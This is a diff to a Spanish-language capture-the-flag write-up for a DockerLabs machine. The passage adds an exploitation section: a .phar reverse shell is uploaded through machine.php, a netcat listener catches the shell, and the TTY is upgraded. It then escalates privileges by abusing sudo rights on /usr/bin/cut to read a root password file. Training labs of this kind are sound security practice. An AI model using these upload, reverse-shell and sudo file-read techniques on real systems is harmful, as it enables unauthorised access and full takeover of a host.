@@ -93,6 +93,9 @@ Progress: 882240 / 882244 (100.00%)
 Finished
 ===============================================================
 ```
+
+## Explotación.
+
 En la página principal no encontramos nada relevante, pero si vemos que hemos encontrado un página **machine.php** que es interesante.
 ![uploadfile](https://github.com/TBrux/DOCKERLABS/assets/168732212/ff1b1175-d44c-4f6b-a996-333b763e137c)
 
@@ -105,5 +108,64 @@ En este caso, la extensión que nos va a funcionar es **.phar**, así que subire
 
 ![reverseshell](https://github.com/TBrux/DOCKERLABS/assets/168732212/479d4098-eee7-493f-813d-68433fa2ebde)
 
-Una vez subido, cuando hemos hecho fuzzing hemos encontrado un directorio llamado **/uploads**, vamos a ese directorio desde el navegaos y ahí tenemos nuestra revershell subida.
+Una vez subido, cuando hemos hecho fuzzing hemos encontrado un directorio llamado **/uploads**, vamos a ese directorio desde el navegador y ahí tenemos nuestra revershell subida.
 
+![uploads](https://github.com/TBrux/DOCKERLABS/assets/168732212/8b7728a5-9405-4a06-b8e4-cb63c4cdb44f)
+
+Ahora nos ponemos en escucha en el puerto configurado en nuestro archivo php y lo ejecutamos.
+```
+❯ nc -lvnp 4443
+listening on [any] 4443 ...
+connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 38426
+Linux fce2bf34762f 6.6.9-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.6.9-1kali1 (2024-01-08) x86_64 x86_64 x86_64 GNU/Linux
+ 12:49:50 up  2:01,  0 user,  load average: 0.02, 0.28, 0.65
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+```
+Hacemos un tratamiento de la tty.
+```bash
+script /dev/null -c bash
+```
+CTRL + Z
+```bash
+stty raw -echo; fg
+reset xterm
+export TERM=xterm
+export SHELL=bash
+```
+
+## Escalada de privilegios.
+En la escalada de privilegios buscamos archivos que podamos utilizar con privilegios de root u otro usuario con más privilegios.
+```
+www-data@fce2bf34762f:/$ sudo -l
+Matching Defaults entries for www-data on fce2bf34762f:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User www-data may run the following commands on fce2bf34762f:
+    (root) NOPASSWD: /usr/bin/cut
+    (root) NOPASSWD: /usr/bin/grep
+www-data@fce2bf34762f:/$
+```
+En este caso vamo a utilizar **/usr/bin/cut**, si vamos a [GTFOBins](https://gtfobins.github.io/gtfobins/cut/), podemos ver como utilizar este binario para leer un archivo txt que encontramos en el directorio **/opt**.
+```
+www-data@fce2bf34762f:/$ cd /opt
+www-data@fce2bf34762f:/opt$ sudo /usr/bin/cut -d "" -f1 "/root/clave.txt"
+dockerlabsmolamogollon123
+www-data@fce2bf34762f:/opt$ 
+```
+Ahora como parece que tenemos la clave de **root**, probamos a cambiar al usuario **root** y lo tenemos.
+```bash
+su root
+```
+```
+www-data@fce2bf34762f:/opt$ su root
+Password: 
+root@fce2bf34762f:/opt# whoami
+root
+root@fce2bf34762f:/opt#
+```
